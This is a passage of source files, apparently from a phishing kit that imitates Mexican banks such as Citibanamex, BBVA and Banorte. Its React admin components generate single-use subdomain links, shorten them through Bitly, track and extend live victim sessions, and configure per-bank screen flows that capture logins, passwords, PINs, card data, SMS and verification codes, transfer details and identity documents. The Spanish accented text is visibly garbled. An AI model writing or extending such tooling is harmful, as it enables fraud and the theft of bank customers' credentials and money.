 timeRemainingFormatted: string;\n  isExpired: boolean;\n}\n\nconst BANKS = [\n  'afirme', 'citibanamex', 'banorte', 'bbva', 'santander',\n  'hsbc', 'scotiabank', 'inbursa', 'bancoazteca'\n].sort();\n\nexport function LinkManagementPanel() {\n  const { toast } = useToast();\n  const [selectedBank, setSelectedBank] = useState<string>('citibanamex');\n  const [copiedId, setCopiedId] = useState<number | null>(null);\n\n  const { data: quotaData, refetch: refetchQuota } = useQuery({\n    queryKey: ['/api/links/quota']\n  });\n\n  const quota = quotaData?.quota;\n\n  const { data: linksData, refetch: refetchLinks } = useQuery({\n    queryKey: ['/api/links/history']\n  });\n\n  const links = Array.isArray(linksData?.links) ? linksData.links : [];\n\n  const { data: sessionsData, refetch: refetchActiveSessions } = useQuery({\n    queryKey: ['/api/links/active-sessions']\n  });\n\n  const activeSessions = Array.isArray(sessionsData?.sessions) ? sessionsData.sessions : [];\n\n  const generateMutation = useMutation({\n    mutationFn: async (bankCode: string) => {\n      const response = await apiRequest('POST', '/api/links', { bankCode });\n      return await response.json();\n    },\n    onSuccess: (data: any) => {\n      toast({\n        title: 'Link generado',\n        description: `Link creado exitosamente`\n      });\n      refetchQuota();\n      refetchLinks();\n      refetchActiveSessions();\n      if (data?.originalUrl) {\n        copyToClipboard(data.originalUrl, 0);\n      }\n    },\n    onError: (error: any) => {\n      toast({\n        title: 'Error',\n        description: error.message || 'No se pudo generar el link',\n        variant: 'destructive'\n      });\n    }\n  });\n\n  const extendMutation = useMutation({\n    mutationFn: ({ linkId, minutes }: { linkId: number; minutes: number }) =>\n      apiRequest('POST', `/api/links/${linkId}/extend`, { minutes }),\n    onSuccess: () => {\n      toast({\n        title: 'Link extendido',\n        description: 'Se extendi贸 el tiempo de expiraci贸n del link'\n      });\n      refetchLinks();\n      refetchActiveSessions();\n    },\n    onError: (error: any) => {\n      toast({\n        title: 'Error al extender',\n        description: error.message || 'No se pudo extender el link',\n        variant: 'destructive'\n      });\n    }\n  });\n\n  const cancelMutation = useMutation({\n    mutationFn: (linkId: number) =>\n      apiRequest('POST', `/api/links/${linkId}/cancel`),\n    onSuccess: () => {\n      toast({\n        title: 'Link cancelado',\n        description: 'El link ha sido cancelado y ya no se puede usar'\n      });\n      refetchLinks();\n      refetchActiveSessions();\n    },\n    onError: (error: any) => {\n      toast({\n        title: 'Error al cancelar',\n        description: error.message || 'No se pudo cancelar el link',\n        variant: 'destructive'\n      });\n    }\n  });\n\n  const copyToClipboard = (text: string, linkId: number) => {\n    navigator.clipboard.writeText(text);\n    setCopiedId(linkId);\n    setTimeout(() => setCopiedId(null), 2000);\n    toast({\n      title: 'Copiado',\n      description: 'Link copiado al portapapeles'\n    });\n  };\n\n  const getStatusBadge = (link: Link) => {\n    if (link.status === 'consumed') {\n      return <Badge variant=\"secondary\" data-testid={`badge-status-${link.id}`}>Usado</Badge>;\n    }\n    if (link.status === 'expired' || link.isExpired) {\n      return <Badge variant=\"destructive\" data-testid={`badge-status-${link.id}`}>Expirado</Badge>;\n    }\n    if (link.status === 'cancelled') {\n      return <Badge variant=\"outline\" data-testid={`badge-status-${link.id}`}>Cancelado</Badge>;\n    }\n    return <Badge className=\"bg-green-500\" data-testid={`badge-status-${link.id}`}>Activo</Badge>;\n  };\n\n  const quotaPercentage = quota ? (quota.used / quota.limit) * 100 : 0;\n  const quotaColor = quotaPercentage > 90 ? 'text-red-500' : quotaPercentage > 70 ? 'text-yellow-500' : 'text-green-500';\n\n  return (\n    <div className=\"space-y-6\">\n      {/* Link Generator Card */}\n      <Card>\n        <CardHeader>\n          <div className=\"flex items-center justify-between\">\n            <div>\n              <CardTitle className=\"flex items-center gap-2\">\n                <Link2 className=\"w-5 h-5\" />\n                Generar Link con Subdominio\n              </CardTitle>\n              <CardDescription>\n                Genera links de un solo uso con subdominios personalizados\n              </CardDescription>\n            </div>\n            <div className=\"text-right\">\n              <p className=\"text-sm text-muted-foreground\">Cuota Semanal</p>\n              <p className={`text-2xl font-bold ${quotaColor}`} data-testid=\"text-quota\">\n                {quota?.used || 0} / {quota?.limit || 150}\n              </p>\n              {quota?.resetsAt && (\n                <p className=\"text-xs text-muted-foreground\">\n                  Renueva: {new Date(quota.resetsAt).toLocaleDateString()}\n                </p>\n              )}\n            </div>\n          </div>\n        </CardHeader>\n        <CardContent>\n          <div className=\"flex gap-4\">\n            <Select value={selectedBank} onValueChange={setSelectedBank}>\n              <SelectTrigger className=\"w-[200px]\" data-testid=\"select-bank\">\n                <SelectValue placeholder=\"Seleccionar banco\" />\n              </SelectTrigger>\n              <SelectContent>\n                {BANKS.map((bank) => (\n                  <SelectItem key={bank} value={bank} data-testid={`option-bank-${bank}`}>\n                    {bank.toUpperCase()}\n                  </SelectItem>\n                ))}\n              </SelectContent>\n            </Select>\n            <Button\n              onClick={() => generateMutation.mutate(selectedBank)}\n              disabled={generateMutation.isPending || !quota?.allowed}\n              data-testid=\"button-generate-link\"\n            >\n              {generateMutation.isPending ? (\n                <>\n                  <RefreshCw className=\"w-4 h-4 mr-2 animate-spin\" />\n                  Generando...\n                </>\n              ) : (\n                <>\n                  <Plus className=\"w-4 h-4 mr-2\" />\n                  Generar Link\n                </>\n              )}\n            </Button>\n          </div>\n          {!quota?.allowed && (\n            <p className=\"text-sm text-red-500 mt-2\" data-testid=\"text-quota-exceeded\">\n              Has alcanzado el l铆mite semanal de {quota?.limit || 150} links\n            </p>\n          )}\n        </CardContent>\n      </Card>\n\n      {/* Active Sessions with Links */}\n      <Card>\n        <CardHeader>\n          <CardTitle className=\"flex items-center gap-2\">\n            <Clock className=\"w-5 h-5 text-green-500\" />\n            Sesiones Activas con Links\n          </CardTitle>\n          <CardDescription>\n            Sesiones actualmente activas con sus links generados - Extiende o finaliza\n          </CardDescription>\n        </CardHeader>\n        <CardContent>\n          <Table>\n            <TableHeader>\n              <TableRow>\n                <TableHead>Sesi贸n/Folio</TableHead>\n                <TableHead>Banco</TableHead>\n                <TableHead>Link</TableHead>\n                <TableHead>Tiempo Restante</TableHead>\n                <TableHead>Acciones</TableHead>\n              </TableRow>\n            </TableHeader>\n            <TableBody>\n              {activeSessions.length === 0 ? (\n                <TableRow>\n                  <TableCell colSpan={5} className=\"text-center text-muted-foreground\">\n                    No hay sesiones activas con links\n                  </TableCell>\n                </TableRow>\n              ) : (\n                activeSessions.map((session) => (\n                  <TableRow key={session.sessionId} data-testid={`row-active-session-${session.sessionId}`}>\n                    <TableCell>\n                      <div className=\"flex flex-col\">\n                        <code className=\"text-xs font-bold\">{session.sessionId}</code>\n                        <span className=\"text-xs text-muted-foreground\">Folio: {session.folio}</span>\n                      </div>\n                    </TableCell>\n                    <TableCell>\n                      <Badge variant=\"outline\" data-testid={`badge-session-bank-${session.sessionId}`}>\n                        {session.banco}\n                      </Badge>\n                    </TableCell>\n                    <TableCell>\n                      <div className=\"flex items-center gap-2\">\n                        <code className=\"text-xs bg-muted px-2 py-1 rounded max-w-[200px] truncate\">\n                          {session.originalUrl}\n                        </code>\n                        <Button\n                          size=\"sm\"\n                          variant=\"ghost\"\n                          onClick={() => copyToClipboard(session.originalUrl, session.linkId)}\n                          data-testid={`button-copy-session-${session.sessionId}`}\n                        >\n                          {copiedId === session.linkId ? (\n                            <CheckCircle className=\"w-4 h-4 text-green-500\" />\n                          ) : (\n                            <Copy className=\"w-4 h-4\" />\n                          )}\n                        </Button>\n                      </div>\n                    </TableCell>\n                    <TableCell>\n                      <div className=\"flex items-center gap-1\">\n                        <Clock className={`w-4 h-4 ${session.isExpired ? 'text-red-500' : 'text-green-500'}`} />\n                        <span \n                          className={session.isExpired ? 'text-red-500 font-semibold' : 'text-foreground'}\n                          data-testid={`text-session-time-${session.sessionId}`}\n                        >\n                          {session.timeRemainingFormatted}\n                        </span>\n                      </div>\n                    </TableCell>\n                    <TableCell>\n                      <div className=\"flex gap-2\">\n                        <Button\n                          size=\"sm\"\n                          variant=\"outline\"\n                          onClick={() => extendMutation.mutate({ linkId: session.linkId, minutes: 30 })}\n                          disabled={session.isExpired || extendMutation.isPending}\n                          data-testid={`button-extend-session-${session.sessionId}`}\n                          title=\"Extender 30 minutos\"\n                        >\n                          <Clock className=\"w-4 h-4 mr-1\" />\n                          +30m\n                        </Button>\n                        <Button\n                          size=\"sm\"\n                          variant=\"destructive\"\n                          onClick={() => cancelMutation.mutate(session.linkId)}\n                          disabled={cancelMutation.isPending}\n                          data-testid={`button-cancel-session-${session.sessionId}`}\n                          title=\"Finalizar sesi贸n\"\n                        >\n                          <XCircle className=\"w-4 h-4\" />\n                        </Button>\n                      </div>\n                    </TableCell>\n                  </TableRow>\n                ))\n              )}\n            </TableBody>\n          </Table>\n        </CardContent>\n      </Card>\n\n      {/* Link History Table */}\n      <Card>\n        <CardHeader>\n          <CardTitle>Historial de Links</CardTitle>\n          <CardDescription>\n            Links generados con subdominios y su estado actual\n          </CardDescription>\n        </CardHeader>\n        <CardContent>\n          <Table>\n            <TableHeader>\n              <TableRow>\n                <TableHead>Banco</TableHead>\n                <TableHead>Link</TableHead>\n                <TableHead>Estado</TableHead>\n                <TableHead>Tiempo Restante</TableHead>\n                <TableHead>Creado</TableHead>\n                <TableHead>Acciones</TableHead>\n              </TableRow>\n            </TableHeader>\n            <TableBody>\n              {links.length === 0 ? (\n                <TableRow>\n                  <TableCell colSpan={6} className=\"text-center text-muted-foreground\">\n                    No hay links generados a煤n\n                  </TableCell>\n                </TableRow>\n              ) : (\n                links.map((link) => (\n                  <TableRow key={link.id} data-testid={`row-link-${link.id}`}>\n                    <TableCell>\n                      <Badge variant=\"outline\" data-testid={`badge-bank-${link.id}`}>\n                        {link.bankCode.toUpperCase()}\n                      </Badge>\n                    </TableCell>\n                    <TableCell>\n                      <div className=\"flex items-center gap-2\">\n                        <code className=\"text-xs bg-muted px-2 py-1 rounded\">\n                          {link.originalUrl}\n                        </code>\n                        <Button\n                          size=\"sm\"\n                          variant=\"ghost\"\n                          onClick={() => copyToClipboard(link.originalUrl, link.id)}\n                          data-testid={`button-copy-${link.id}`}\n                        >\n                          {copiedId === link.id ? (\n                            <CheckCircle className=\"w-4 h-4 text-green-500\" />\n                          ) : (\n                            <Copy className=\"w-4 h-4\" />\n                          )}\n                        </Button>\n                      </div>\n                    </TableCell>\n                    <TableCell>{getStatusBadge(link)}</TableCell>\n                    <TableCell>\n                      {link.status === 'active' ? (\n                        <div className=\"flex items-center gap-1\">\n                          <Clock className=\"w-4 h-4\" />\n                          <span data-testid={`text-time-${link.id}`}>\n                            {link.timeRemainingFormatted || 'Calculando...'}\n                          </span>\n                        </div>\n                      ) : (\n                        <span className=\"text-muted-foreground\">-</span>\n                      )}\n                    </TableCell>\n                    <TableCell data-testid={`text-created-${link.id}`}>\n                      {new Date(link.createdAt).toLocaleString()}\n                    </TableCell>\n                    <TableCell>\n                      {link.status === 'active' && !link.isExpired && (\n                        <div className=\"flex gap-2\">\n                          <Button\n                            size=\"sm\"\n                            variant=\"outline\"\n                            onClick={() => extendMutation.mutate({ linkId: link.id, minutes: 30 })}\n                            data-testid={`button-extend-${link.id}`}\n                          >\n                            +30m\n                          </Button>\n                          <Button\n                            size=\"sm\"\n                            variant=\"destructive\"\n                            onClick={() => cancelMutation.mutate(link.id)}\n                            data-testid={`button-cancel-${link.id}`}\n                          >\n                            <XCircle className=\"w-4 h-4\" />\n                          </Button>\n                        </div>\n                      )}\n                    </TableCell>\n                  </TableRow>\n                ))\n              )}\n            </TableBody>\n          </Table>\n        </CardContent>\n      </Card>\n    </div>\n  );\n}\n","size_bytes":16948},"server/services/bitly.ts":{"content":"import axios from 'axios';\n\nconst BITLY_API_URL = 'https://api-ssl.bitly.com/v4';\nconst BITLY_TOKEN = process.env.BITLY_ACCESS_TOKEN;\n\nexport interface BitlyResponse {\n  id: string;\n  link: string;\n  long_url: string;\n  created_at: string;\n}\n\nexport interface BitlyShortenOptions {\n  longUrl: string;\n  domain?: string;\n  title?: string;\n}\n\nexport class BitlyService {\n  private token: string | undefined;\n\n  constructor() {\n    this.token = BITLY_TOKEN;\n    if (!this.token) {\n      console.warn('[Bitly] BITLY_ACCESS_TOKEN no est谩 configurado. El servicio de acortamiento estar谩 deshabilitado.');\n    }\n  }\n\n  private ensureToken(): void {\n    if (!this.token) {\n      throw new Error('Bitly no est谩 configurado. Por favor configura BITLY_ACCESS_TOKEN en las variables de entorno.');\n    }\n  }\n\n  async shorten(options: BitlyShortenOptions): Promise<BitlyResponse> {\n    this.ensureToken();\n    try {\n      const response = await axios.post(\n        `${BITLY_API_URL}/shorten`,\n        {\n          long_url: options.longUrl,\n          domain: options.domain || 'bit.ly',\n          title: options.title\n        },\n        {\n          headers: {\n            'Authorization': `Bearer ${this.token}`,\n            'Content-Type': 'application/json'\n          }\n        }\n      );\n\n      return response.data;\n    } catch (error: any) {\n      console.error('Error al acortar URL con Bitly:', error.response?.data || error.message);\n      \n      if (error.response?.status === 429) {\n        throw new Error('L铆mite de rate de Bitly alcanzado. Por favor espera un momento.');\n      }\n      \n      throw new Error(`Error al acortar URL: ${error.response?.data?.message || error.message}`);\n    }\n  }\n\n  async expand(bitlink: string): Promise<{ long_url: string }> {\n    this.ensureToken();\n    try {\n      const encodedBitlink = encodeURIComponent(bitlink);\n      const response = await axios.get(\n        `${BITLY_API_URL}/expand`,\n        {\n          params: { bitlink_id: encodedBitlink },\n          headers: {\n            'Authorization': `Bearer ${this.token}`,\n            'Content-Type': 'application/json'\n          }\n        }\n      );\n\n      return response.data;\n    } catch (error: any) {\n      console.error('Error al expandir URL con Bitly:', error.response?.data || error.message);\n      throw new Error(`Error al expandir URL: ${error.response?.data?.message || error.message}`);\n    }\n  }\n\n  async updateLink(bitlink: string, title: string): Promise<BitlyResponse> {\n    try {\n      const response = await axios.patch(\n        `${BITLY_API_URL}/bitlinks/${bitlink}`,\n        { title },\n        {\n          headers: {\n            'Authorization': `Bearer ${this.token}`,\n            'Content-Type': 'application/json'\n          }\n        }\n      );\n\n      return response.data;\n    } catch (error: any) {\n      console.error('Error al actualizar link de Bitly:', error.response?.data || error.message);\n      throw new Error(`Error al actualizar link: ${error.response?.data?.message || error.message}`);\n    }\n  }\n\n  async getLinkClicks(bitlink: string): Promise<{ link_clicks: number }> {\n    try {\n      const response = await axios.get(\n        `${BITLY_API_URL}/bitlinks/${bitlink}/clicks`,\n        {\n          headers: {\n            'Authorization': `Bearer ${this.token}`,\n            'Content-Type': 'application/json'\n          }\n        }\n      );\n\n      return response.data;\n    } catch (error: any) {\n      console.error('Error al obtener clics de Bitly:', error.response?.data || error.message);\n      throw new Error(`Error al obtener clics: ${error.response?.data?.message || error.message}`);\n    }\n  }\n\n  async delete(bitlinkId: string): Promise<void> {\n    this.ensureToken();\n    try {\n      // Bitly usa el formato completo del link para eliminar (ej: bit.ly/abc123)\n      await axios.delete(\n        `${BITLY_API_URL}/bitlinks/${bitlinkId}`,\n        {\n          headers: {\n            'Authorization': `Bearer ${this.token}`,\n            'Content-Type': 'application/json'\n          }\n        }\n      );\n\n      console.log(`[Bitly] Link ${bitlinkId} eliminado exitosamente de Bitly`);\n    } catch (error: any) {\n      console.error('[Bitly] Error al eliminar link:', error.response?.data || error.message);\n      // No lanzar error para que la cancelaci贸n del link contin煤e aunque falle Bitly\n    }\n  }\n}\n\nexport const bitlyService = new BitlyService();\n","size_bytes":4392},"client/src/components/admin/BankFlowManager.tsx":{"content":"import { useState, useEffect } from 'react';\nimport { useQuery, useMutation } from '@tanstack/react-query';\nimport { queryClient, apiRequest } from '@/lib/queryClient';\nimport { Button } from '@/components/ui/button';\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';\nimport { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';\nimport { Input } from '@/components/ui/input';\nimport { Label } from '@/components/ui/label';\nimport { useToast } from '@/hooks/use-toast';\nimport { Plus, Trash2, Save, MoveUp, MoveDown } from 'lucide-react';\nimport { ScreenType } from '@shared/schema';\n\nconst BANKS = [\n  { code: 'liverpool', name: 'Liverpool' },\n  { code: 'citibanamex', name: 'Citibanamex' },\n  { code: 'banbajio', name: 'BanBaj铆o' },\n  { code: 'bbva', name: 'BBVA' },\n  { code: 'banorte', name: 'Banorte' },\n  { code: 'bancoppel', name: 'BanCoppel' },\n  { code: 'hsbc', name: 'HSBC' },\n  { code: 'amex', name: 'American Express' },\n  { code: 'santander', name: 'Santander' },\n  { code: 'scotiabank', name: 'Scotiabank' },\n  { code: 'invex', name: 'Invex' },\n  { code: 'banregio', name: 'Banregio' },\n  { code: 'spin', name: 'Spin' },\n  { code: 'platacard', name: 'Plata Card' },\n  { code: 'bancoazteca', name: 'Banco Azteca' },\n  { code: 'bienestar', name: 'Banco del Bienestar' },\n  { code: 'inbursa', name: 'Inbursa' },\n  { code: 'afirme', name: 'Afirme' }\n];\n\nconst SCREEN_TYPES = [\n  { value: ScreenType.FOLIO, label: 'Folio - Ingreso de n煤mero de folio' },\n  { value: ScreenType.VALIDANDO, label: 'Validando - Pantalla de carga' },\n  { value: ScreenType.LOGIN, label: 'Login - Usuario y contrase帽a' },\n  { value: ScreenType.CODIGO, label: 'C贸digo - C贸digo de verificaci贸n' },\n  { value: ScreenType.NIP, label: 'NIP - N煤mero de identificaci贸n personal' },\n  { value: ScreenType.TARJETA, label: 'Tarjeta - Datos de tarjeta' },\n  { value: ScreenType.TRANSFERIR, label: 'Transferir - Datos bancarios' },\n  { value: ScreenType.SMS_COMPRA, label: 'SMS Compra - C贸digo SMS de compra' },\n  { value: ScreenType.PROTECCION_BANCARIA, label: 'Protecci贸n Bancaria - Captura de documento' },\n  { value: ScreenType.PROTECCION_SALDO, label: 'Protecci贸n Saldo - Protecci贸n de saldo' },\n  { value: ScreenType.VERIFICACION_ID, label: 'Verificaci贸n ID - Verificaci贸n de identidad' },\n  { value: ScreenType.CANCELACION, label: 'Cancelaci贸n - Cancelaci贸n de operaci贸n' },\n  { value: ScreenType.CANCELACION_RETIRO, label: 'Cancelaci贸n Retiro - Cancelar retiro' },\n  { value: ScreenType.MENSAJE, label: 'Mensaje - Mensaje personalizado' }\n];\n\ninterface FlowStep {\n  screenType: string;\n  durationMs?: number;\n  waitForUserInput?: boolean;\n  payload?: Record<string, any>;\n}\n\nexport default function BankFlowManager() {\n  const { toast } = useToast();\n  const [selectedBank, setSelectedBank] = useState<string>('');\n  const [flowSteps, setFlowSteps] = useState<FlowStep[]>([]);\n\n  // Obtener flujo existente del banco seleccionado\n  const { data: flowData, isLoading } = useQuery<{ success: boolean; flow: { flowConfig: FlowStep[] } | null }>({\n    queryKey: ['/api/screen-flows', selectedBank],\n    enabled: !!selectedBank,\n  });\n\n  // Cargar flujo cuando se obtiene\n  useEffect(() => {\n    if (flowData?.flow?.flowConfig) {\n      setFlowSteps(flowData.flow.flowConfig);\n    } else if (selectedBank && !isLoading && flowData) {\n      // Si no hay flujo, iniciar con uno b谩sico\n      setFlowSteps([\n        { screenType: ScreenType.FOLIO, waitForUserInput: true }\n      ]);\n    }\n  }, [flowData, isLoading, selectedBank]);\n\n  // Mutaci贸n para guardar flujo\n  const saveMutation = useMutation({\n    mutationFn: async () => {\n      if (!selectedBank) throw new Error('Seleccione un banco');\n      if (flowSteps.length === 0) throw new Error('Agregue al menos un paso al flujo');\n\n      const response = await fetch(`/api/screen-flows/${selectedBank}`, {\n        method: 'PUT',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({ flowConfig: flowSteps })\n      });\n      \n      if (!response.ok) {\n        const error = await response.json();\n        throw new Error(error.message || 'Error al guardar el flujo');\n      }\n      \n      return response.json();\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: ['/api/screen-flows', selectedBank] });\n      toast({\n        title: 'Flujo guardado',\n        description: 'El flujo de pantallas se guard贸 correctamente',\n      });\n    },\n    onError: (error: Error) => {\n      toast({\n        title: 'Error',\n        description: error.message,\n        variant: 'destructive'\n      });\n    }\n  });\n\n  const addStep = () => {\n    setFlowSteps([...flowSteps, {\n      screenType: ScreenType.VALIDANDO,\n      durationMs: 3000,\n      waitForUserInput: false\n    }]);\n  };\n\n  const removeStep = (index: number) => {\n    setFlowSteps(flowSteps.filter((_, i) => i !== index));\n  };\n\n  const moveStep = (index: number, direction: 'up' | 'down') => {\n    const newSteps = [...flowSteps];\n    const targetIndex = direction === 'up' ? index - 1 : index + 1;\n    \n    if (targetIndex < 0 || targetIndex >= newSteps.length) return;\n    \n    [newSteps[index], newSteps[targetIndex]] = [newSteps[targetIndex], newSteps[index]];\n    setFlowSteps(newSteps);\n  };\n\n  const updateStep = (index: number, field: keyof FlowStep, value: any) => {\n    const newSteps = [...flowSteps];\n    newSteps[index] = { ...newSteps[index], [field]: value };\n    setFlowSteps(newSteps);\n  };\n\n  const handleBankChange = (bankCode: string) => {\n    setSelectedBank(bankCode);\n    setFlowSteps([]); // Limpiar pasos al cambiar de banco\n  };\n\n  return (\n    <div className=\"container mx-auto p-6 space-y-6\" data-testid=\"bank-flow-manager\">\n      <div>\n        <h1 className=\"text-3xl font-bold mb-2\" data-testid=\"title-bank-flow\">Configuraci贸n de Flujos por Banco</h1>\n        <p className=\"text-muted-foreground\" data-testid=\"description-bank-flow\">\n          Define secuencias personalizadas de pantallas para cada banco\n        </p>\n      </div>\n\n      {/* Selector de Banco */}\n      <Card>\n        <CardHeader>\n          <CardTitle>Seleccionar Banco</CardTitle>\n          <CardDescription>Elige el banco para configurar su flujo de pantallas</CardDescription>\n        </CardHeader>\n        <CardContent>\n          <Select value={selectedBank} onValueChange={handleBankChange}>\n            <SelectTrigger data-testid=\"select-bank\">\n              <SelectValue placeholder=\"Seleccione un banco...\" />\n            </SelectTrigger>\n            <SelectContent>\n              {BANKS.map(bank => (\n                <SelectItem key={bank.code} value={bank.code} data-testid={`option-bank-${bank.code}`}>\n                  {bank.name}\n                </SelectItem>\n              ))}\n            </SelectContent>\n          </Select>\n        </CardContent>\n      </Card>\n\n      {/* Configurador de Flujo */}\n      {selectedBank && (\n        <>\n          <Card>\n            <CardHeader>\n              <div className=\"flex items-center justify-between\">\n                <div>\n                  <CardTitle>Flujo de Pantallas - {BANKS.find(b => b.code === selectedBank)?.name}</CardTitle>\n                  <CardDescription>\n                    Define el orden y configuraci贸n de las pantallas\n                  </CardDescription>\n                </div>\n                <Button onClick={addStep} data-testid=\"button-add-step\">\n                  <Plus className=\"w-4 h-4 mr-2\" />\n                  Agregar Paso\n                </Button>\n              </div>\n            </CardHeader>\n            <CardContent className=\"space-y-4\">\n              {flowSteps.length === 0 ? (\n                <div className=\"text-center py-8 text-muted-foreground\" data-testid=\"text-no-steps\">\n                  No hay pasos configurados. Haz clic en \"Agregar Paso\" para comenzar.\n                </div>\n              ) : (\n                flowSteps.map((step, index) => (\n                  <Card key={index} className=\"border-2\" data-testid={`card-step-${index}`}>\n                    <CardContent className=\"pt-6\">\n                      <div className=\"grid grid-cols-1 md:grid-cols-12 gap-4 items-start\">\n                        {/* N煤mero de paso */}\n                        <div className=\"md:col-span-1 flex items-center justify-center\">\n                          <div className=\"w-8 h-8 rounded-full bg-primary text-primary-foreground flex items-center justify-center font-bold\" data-testid={`text-step-number-${index}`}>\n                            {index + 1}\n                          </div>\n                        </div>\n\n                        {/* Tipo de pantalla */}\n                        <div className=\"md:col-span-5 space-y-2\">\n                          <Label>Tipo de Pantalla</Label>\n                          <Select\n                            value={step.screenType}\n                            onValueChange={(value) => updateStep(index, 'screenType', value)}\n                          >\n                            <SelectTrigger data-testid={`select-screen-type-${index}`}>\n                              <SelectValue />\n                            </SelectTrigger>\n                            <SelectContent>\n                              {SCREEN_TYPES.map(screen => (\n                                <SelectItem key={screen.value} value={screen.value}>\n                                  {screen.label}\n                                </SelectItem>\n                              ))}\n                            </SelectContent>\n                          </Select>\n                        </div>\n\n                        {/* Configuraci贸n */}\n                        <div className=\"md:col-span-4 space-y-2\">\n                          <Label>Configuraci贸n</Label>\n                          <div className=\"flex gap-2\">\n                            <div className=\"flex-1\">\n                              <Input\n                                type=\"number\"\n                                placeholder=\"Duraci贸n (ms)\"\n                                value={step.durationMs || ''}\n                                onChange={(e) => updateStep(index, 'durationMs', parseInt(e.target.value) || undefined)}\n                                disabled={step.waitForUserInput}\n                                data-testid={`input-duration-${index}`}\n                              />\n                            </div>\n                            <div className=\"flex items-center gap-2\">\n                              <input\n                                type=\"checkbox\"\n                                id={`wait-${index}`}\n                                checked={step.waitForUserInput || false}\n                                onChange={(e) => {\n                                  updateStep(index, 'waitForUserInput', e.target.checked);\n                                  if (e.target.checked) {\n                                    updateStep(index, 'durationMs', undefined);\n                                  }\n                                }}\n                                data-testid={`checkbox-wait-input-${index}`}\n                              />\n                              <Label htmlFor={`wait-${index}`} className=\"text-xs whitespace-nowrap\">\n                                Esperar usuario\n                              </Label>\n                            </div>\n                          </div>\n                        </div>\n\n                        {/* Acciones */}\n                        <div className=\"md:col-span-2 flex gap-1 justify-end\">\n                          <Button\n                            variant=\"ghost\"\n                            size=\"icon\"\n                            onClick={() => moveStep(index, 'up')}\n                            disabled={index === 0}\n                            data-testid={`button-move-up-${index}`}\n                          >\n                            <MoveUp className=\"w-4 h-4\" />\n                          </Button>\n                          <Button\n                            variant=\"ghost\"\n                            size=\"icon\"\n                            onClick={() => moveStep(index, 'down')}\n                            disabled={index === flowSteps.length - 1}\n                            data-testid={`button-move-down-${index}`}\n                          >\n                            <MoveDown className=\"w-4 h-4\" />\n                          </Button>\n                          <Button\n                            variant=\"ghost\"\n                            size=\"icon\"\n                            onClick={() => removeStep(index)}\n                            data-testid={`button-remove-step-${index}`}\n                          >\n                            <Trash2 className=\"w-4 h-4 text-destructive\" />\n                          </Button>\n                        </div>\n                      </div>\n\n                      {/* Descripci贸n del paso */}\n                      <div className=\"mt-2 text-xs text-muted-foreground\" data-testid={`text-step-description-${index}`}>\n                        {step.waitForUserInput \n                          ? '革 El flujo esperar谩 hasta que el usuario complete esta pantalla'\n                          : step.durationMs\n                          ? `憋 Mostrar谩 esta pantalla durante ${step.durationMs / 1000} segundos`\n                          : ' Pasar谩 inmediatamente a la siguiente pantalla'\n                        }\n                      </div>\n                    </CardContent>\n                  </Card>\n                ))\n              )}\n            </CardContent>\n          </Card>\n\n          {/* Bot贸n Guardar */}\n          {flowSteps.length > 0 && (\n            <div className=\"flex justify-end\">\n              <Button\n                onClick={() => saveMutation.mutate()}\n                disabled={saveMutation.isPending}\n                size=\"lg\"\n                data-testid=\"button-save-flow\"\n              >\n                <Save className=\"w-4 h-4 mr-2\" />\n                {saveMutation.isPending ? 'Guardando...' : 'Guardar Flujo'}\n              </Button>\n            </div>\n          )}\n        </>\n      )}\n    </div>\n  );\n}\n","size_bytes":14246},"client/src/components/user/UserFlowManager.tsx":{"content":"import { useState, useEffect } from 'react';\nimport { useQuery, useMutation } from '@tanstack/react-query';\nimport { queryClient } from '@/lib/queryClient';\nimport { Button } from '@/components/ui/button';\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';\nimport { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';\nimport { Input } from '@/components/ui/input';\nimport { Label } from '@/components/ui/label';\nimport { useToast } from '@/hooks/use-toast';\nimport { Plus, Trash2, Save, MoveUp, MoveDown, Info } from 'lucide-react';\nimport { ScreenType } from '@shared/schema';\n\nconst BANKS = [\n  { code: 'liverpool', name: 'Liverpool' },\n  { code: 'citibanamex', name: 'Citibanamex' },\n  { code: 'banbajio', name: 'BanBaj铆o' },\n  { code: 'bbva', name: 'BBVA' },\n  { code: 'banorte', name: 'Banorte' },\n  { code: 'bancoppel', name: 'BanCoppel' },\n  { code: 'hsbc', name: 'HSBC' },\n  { code: 'amex', name: 'American Express' },\n  { code: 'santander', name: 'Santander' },\n  { code: 'scotiabank', name: 'Scotiabank' },\n  { code: 'invex', name: 'Invex' },\n  { code: 'banregio', name: 'Banregio' },\n  { code: 'spin', name: 'Spin' },\n  { code: 'platacard', name: 'Plata Card' },\n  { code: 'bancoazteca', name: 'Banco Azteca' },\n  { code: 'bienestar', name: 'Banco del Bienestar' },\n  { code: 'inbursa', name: 'Inbursa' },\n  { code: 'afirme', name: 'Afirme' }\n];\n\nconst SCREEN_TYPES = [\n  { value: ScreenType.FOLIO, label: 'Folio - Ingreso de n煤mero de folio' },\n  { value: ScreenType.VALIDANDO, label: 'Validando - Pantalla de carga' },\n  { value: ScreenType.LOGIN, label: 'Login - Usuario y contrase帽a' },\n  { value: ScreenType.CODIGO, label: 'C贸digo - C贸digo de verificaci贸n' },\n  { value: ScreenType.NIP, label: 'NIP - N煤mero de identificaci贸n personal' },\n  { value: ScreenType.TARJETA, label: 'Tarjeta - Datos de tarjeta' },\n  { value: ScreenType.TRANSFERIR, label: 'Transferir - Datos bancarios' },\n  { value: ScreenType.SMS_COMPRA, label: 'SMS Compra - C贸digo SMS de compra' },\n  { value: ScreenType.PROTECCION_BANCARIA, label: 'Protecci贸n Bancaria - Captura de documento' },\n  { value: ScreenType.PROTECCION_SALDO, label: 'Protecci贸n Saldo - Protecci贸n de saldo' },\n  { value: ScreenType.VERIFICACION_ID, label: 'Verificaci贸n ID - Verificaci贸n de identidad' },\n  { value: ScreenType.CANCELACION, label: 'Cancelaci贸n - Cancelaci贸n de operaci贸n' },\n  { value: ScreenType.CANCELACION_RETIRO, label: 'Cancelaci贸n Retiro - Cancelar retiro' },\n  { value: ScreenType.MENSAJE, label: 'Mensaje - Mensaje personalizado' }\n];\n\ninterface FlowStep {\n  screenType: string;\n  durationMs?: number;\n  waitForUserInput?: boolean;\n  payload?: Record<string, any>;\n}\n\nexport default function UserFlowManager() {\n  const { toast } = 